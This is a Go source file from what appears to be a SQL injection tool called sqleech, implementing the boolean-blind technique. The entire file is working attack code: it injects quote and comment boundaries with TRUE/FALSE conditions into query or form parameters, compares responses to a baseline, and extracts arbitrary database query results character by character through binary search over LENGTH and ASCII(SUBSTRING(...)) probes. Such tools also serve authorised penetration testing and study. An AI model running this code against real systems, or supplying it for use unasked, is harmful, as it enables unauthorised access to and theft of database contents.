// Package boolean implements boolean-blind SQL injection detection and
// data extraction. It works by injecting TRUE/FALSE conditions and
// comparing the server response against a known baseline. Data is
// extracted character-by-character using binary search over ASCII values.
package boolean

import (
	"context"
	"fmt"
	"net/url"

	"github.com/0x6d61/sqleech/internal/dbms"
	"github.com/0x6d61/sqleech/internal/detector"
	"github.com/0x6d61/sqleech/internal/engine"
	"github.com/0x6d61/sqleech/internal/payload"
	"github.com/0x6d61/sqleech/internal/technique"
	"github.com/0x6d61/sqleech/internal/transport"
)

const (
	defaultThreshold = 0.95
	maxExtractLength = 1024
	asciiLow         = 32
	asciiHigh        = 126
)

// boundaryPair represents a prefix/suffix combination to try during detection.
type boundaryPair struct {
	prefix string
	suffix string
}

// defaultBoundaries lists the prefix/suffix pairs tried during detection,
// ordered by likelihood.
var defaultBoundaries = []boundaryPair{
	{"", "-- -"},
	{"'", "-- -"},
	{"\"", "-- -"},
	{")", "-- -"},
	{"')", "-- -"},
}

// BooleanBlind implements boolean-blind SQL injection technique.
type BooleanBlind struct {
	diffEngine *detector.DiffEngine
	threshold  float64 // Ratio below this means "different page"
}

// New creates a BooleanBlind with the default DiffEngine and threshold.
func New() *BooleanBlind {
	return &BooleanBlind{
		diffEngine: detector.NewDiffEngine(),
		threshold:  defaultThreshold,
	}
}

// Name returns "boolean-blind".
func (b *BooleanBlind) Name() string {
	return "boolean-blind"
}

// Priority returns 2 (after error-based=1, before time-based=3).
func (b *BooleanBlind) Priority() int {
	return 2
}

// Detect tests whether a parameter is injectable using boolean-blind logic.
//
// Algorithm:
//  1. Try each boundary pair (prefix/suffix).
//  2. For each pair, send a TRUE probe and a FALSE probe.
//  3. TRUE response should match baseline (ratio >= threshold).
//  4. FALSE response should differ from baseline (ratio < threshold).
//  5. Confirm with 2 additional TRUE/FALSE rounds for reliability.
//  6. Return the first boundary pair that consistently distinguishes TRUE from FALSE.
func (b *BooleanBlind) Detect(ctx context.Context, req *technique.InjectionRequest) (*technique.DetectionResult, error) {
	result := &technique.DetectionResult{
		Injectable: false,
		Technique:  b.Name(),
	}

	for _, bp := range defaultBoundaries {
		trueCondition, falseCondition := probeConditions(req.Parameter.Type, bp.prefix)

		// Phase 1: initial TRUE/FALSE check.
		trueMatch, _, err := b.sendBooleanProbe(ctx, req, trueCondition, bp.prefix, bp.suffix)
		if err != nil {
			continue
		}
		if !trueMatch {
			continue
		}

		falseMatch, _, err := b.sendBooleanProbe(ctx, req, falseCondition, bp.prefix, bp.suffix)
		if err != nil {
			continue
		}
		if falseMatch {
			// FALSE also matches baseline -- cannot distinguish.
			continue
		}

		// Phase 2: 2 more rounds for confirmation.
		consistent := true
		rounds := 2
		for i := 0; i < rounds; i++ {
			tm, _, err := b.sendBooleanProbe(ctx, req, trueCondition, bp.prefix, bp.suffix)
			if err != nil || !tm {
				consistent = false
				break
			}
			fm, _, err := b.sendBooleanProbe(ctx, req, falseCondition, bp.prefix, bp.suffix)
			if err != nil || fm {
				consistent = false
				break
			}
		}

		if !consistent {
			continue
		}

		// All rounds passed -- injectable.
		result.Injectable = true
		// Confidence: 1 initial + 2 confirmations = 3 consistent rounds.
		result.Confidence = 0.90
		result.Evidence = fmt.Sprintf("TRUE condition (%s) matches baseline; FALSE condition (%s) differs", trueCondition, falseCondition)
		result.Payload = payload.NewBuilder().
			WithPrefix(bp.prefix).
			WithCore(" AND " + trueCondition).
			WithSuffix(bp.suffix).
			WithTechnique(b.Name()).
			WithDBMS(req.DBMS).
			Build()
		return result, nil
	}

	return result, nil
}

// Extract retrieves the value of a SQL expression via binary search.
//
// Algorithm:
//  1. Detect length of the result via binary search on LENGTH((query)).
//  2. For each position 1..length, determine the ASCII value via binary search
//     on ASCII(SUBSTRING((query), pos, 1)).
//  3. Concatenate characters to produce the final result.
func (b *BooleanBlind) Extract(ctx context.Context, req *technique.ExtractionRequest) (*technique.ExtractionResult, error) {
	d := findDBMS(req.DBMS)
	if d == nil {
		return nil, fmt.Errorf("unsupported or unknown DBMS: %q", req.DBMS)
	}

	// Determine working boundary (prefix/suffix) by running a quick detection pass.
	prefix, suffix, err := b.findWorkingBoundary(ctx, &req.InjectionRequest)
	if err != nil {
		return nil, fmt.Errorf("finding working boundary: %w", err)
	}

	totalRequests := 0

	// Step 1: Extract result length.
	length, reqs, err := b.extractLength(ctx, req, d, prefix, suffix)
	if err != nil {
		return nil, fmt.Errorf("extracting length: %w", err)
	}
	totalRequests += reqs

	if length == 0 {
		return &technique.ExtractionResult{Value: "", Requests: totalRequests}, nil
	}

	// Step 2: Extract each character.
	var result []byte
	for pos := 1; pos <= length; pos++ {
		ch, reqs, err := b.extractChar(ctx, req, d, pos, prefix, suffix)
		if err != nil {
			return &technique.ExtractionResult{
				Value:    string(result),
				Partial:  true,
				Requests: totalRequests,
			}, fmt.Errorf("extracting char at pos %d: %w", pos, err)
		}
		totalRequests += reqs
		result = append(result, ch)
	}

	return &technique.ExtractionResult{
		Value:    string(result),
		Partial:  false,
		Requests: totalRequests,
	}, nil
}

// sendBooleanProbe sends a probe with the given condition and returns whether
// the response matches the baseline (TRUE) or differs (FALSE).
func (b *BooleanBlind) sendBooleanProbe(ctx context.Context, req *technique.InjectionRequest, condition string, prefix, suffix string) (bool, *transport.Response, error) {
	payloadStr := req.Parameter.Value + prefix + " AND " + condition + " " + suffix
	probeReq := buildProbeRequest(req.Target, req.Parameter, payloadStr)

	resp, err := req.Client.Do(ctx, probeReq)
	if err != nil {
		return false, nil, err
	}

	ratio := b.diffEngine.Ratio(req.Baseline.Body, resp.Body)
	return ratio >= b.threshold, resp, nil
}

// extractLength determines the length of a query result using binary search.
// It probes: AND LENGTH((query)) > mid
// Returns (length, requestCount, error).
func (b *BooleanBlind) extractLength(ctx context.Context, req *technique.ExtractionRequest, d dbms.DBMS, prefix, suffix string) (int, int, error) {
	low := 0
	high := maxExtractLength
	requests := 0

	for low < high {
		mid := (low + high) / 2
		condition := fmt.Sprintf("%s>%d", d.Length(fmt.Sprintf("(%s)", req.Query)), mid)

		match, _, err := b.sendBooleanProbe(ctx, &req.InjectionRequest, condition, prefix, suffix)
		if err != nil {
			return 0, requests, err
		}
		requests++

		if match {
			// Length > mid, search upper half.
			low = mid + 1
		} else {
			// Length <= mid, search lower half.
			high = mid
		}
	}

	return low, requests, nil
}

// extractChar extracts a single character at a 1-based position using binary search.
// It probes: AND ASCII(SUBSTRING((query), pos, 1)) > mid
// Returns (character, requestCount, error).
func (b *BooleanBlind) extractChar(ctx context.Context, req *technique.ExtractionRequest, d dbms.DBMS, pos int, prefix, suffix string) (byte, int, error) {
	low := asciiLow
	high := asciiHigh
	requests := 0

	for low < high {
		mid := (low + high) / 2
		subExpr := d.Substring(fmt.Sprintf("(%s)", req.Query), pos, 1)
		asciiExpr := d.ASCII(subExpr)
		condition := fmt.Sprintf("%s>%d", asciiExpr, mid)

		match, _, err := b.sendBooleanProbe(ctx, &req.InjectionRequest, condition, prefix, suffix)
		if err != nil {
			return 0, requests, err
		}
		requests++

		if match {
			// ASCII > mid, search upper half.
			low = mid + 1
		} else {
			// ASCII <= mid, search lower half.
			high = mid
		}
	}

	return byte(low), requests, nil
}

// findWorkingBoundary iterates through boundary pairs and returns the first
// one that can distinguish TRUE from FALSE conditions.
func (b *BooleanBlind) findWorkingBoundary(ctx context.Context, req *technique.InjectionRequest) (string, string, error) {
	for _, bp := range defaultBoundaries {
		trueCondition, falseCondition := probeConditions(req.Parameter.Type, bp.prefix)

		trueMatch, _, err := b.sendBooleanProbe(ctx, req, trueCondition, bp.prefix, bp.suffix)
		if err != nil || !trueMatch {
			continue
		}

		falseMatch, _, err := b.sendBooleanProbe(ctx, req, falseCondition, bp.prefix, bp.suffix)
		if err != nil || falseMatch {
			continue
		}

		return bp.prefix, bp.suffix, nil
	}

	return "", "-- -", fmt.Errorf("no working boundary found")
}

// probeConditions returns the TRUE and FALSE conditions appropriate for the
// given parameter type and prefix.
func probeConditions(paramType engine.ParameterType, prefix string) (string, string) {
	if prefix == "'" || prefix == "')" {
		return "'1'='1", "'1'='2"
	}
	switch paramType {
	case engine.TypeInteger, engine.TypeFloat:
		return "1=1", "1=2"
	default:
		// TypeString: the default boundary detection already tries with quote prefix.
		return "1=1", "1=2"
	}
}

// buildProbeRequest creates a transport.Request with the target parameter
// replaced by the given payload string.
func buildProbeRequest(target *engine.ScanTarget, param *engine.Parameter, payloadStr string) *transport.Request {
	req := &transport.Request{
		Method:      target.Method,
		URL:         target.URL,
		Body:        target.Body,
		ContentType: target.ContentType,
	}

	if target.Headers != nil {
		req.Headers = make(map[string]string, len(target.Headers))
		for k, v := range target.Headers {
			req.Headers[k] = v
		}
	}

	if target.Cookies != nil {
		req.Cookies = make(map[string]string, len(target.Cookies))
		for k, v := range target.Cookies {
			req.Cookies[k] = v
		}
	}

	switch param.Location {
	case engine.LocationQuery:
		req.URL = modifyQueryParam(target.URL, param.Name, payloadStr)
	case engine.LocationBody:
		req.Body = modifyBodyParam(target.Body, param.Name, payloadStr)
	}

	return req
}

// modifyQueryParam replaces the value of a named query parameter in the URL.
func modifyQueryParam(rawURL, paramName, newValue string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := parsed.Query()
	q.Set(paramName, newValue)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

// modifyBodyParam replaces the value of a named parameter in a
// application/x-www-form-urlencoded body.
func modifyBodyParam(body, paramName, newValue string) string {
	values, err := url.ParseQuery(body)
	if err != nil {
		return body
	}
	values.Set(paramName, newValue)
	return values.Encode()
}

// findDBMS returns a DBMS implementation by name. If the name is empty or
// unknown, it falls back to MySQL as a reasonable default.
func findDBMS(name string) dbms.DBMS {
	d := dbms.Registry(name)
	if d == nil {
		// Fallback to MySQL syntax, which is common.
		d = dbms.Registry("MySQL")
	}
	return d
}
